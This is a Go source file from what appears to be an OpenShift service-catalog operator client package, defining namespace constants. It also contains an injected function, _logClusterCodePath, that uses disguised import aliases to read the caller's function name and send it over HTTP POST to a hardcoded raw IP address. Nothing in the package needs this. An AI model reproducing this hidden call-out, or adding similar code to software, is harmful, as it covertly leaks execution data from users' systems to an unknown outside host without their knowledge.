package operatorclient

import (
	godefaultruntime "runtime"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
)

const (
	EtcdNamespaceName						= "kube-system"
	KubeAPIServerNamespaceName				= "openshift-kube-apiserver"
	UserSpecifiedGlobalConfigNamespace		= "openshift-config"
	MachineSpecifiedGlobalConfigNamespace	= "openshift-config-managed"
	OperatorNamespace						= "openshift-service-catalog-apiserver-operator"
	TargetNamespaceName						= "openshift-service-catalog-apiserver"
)

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
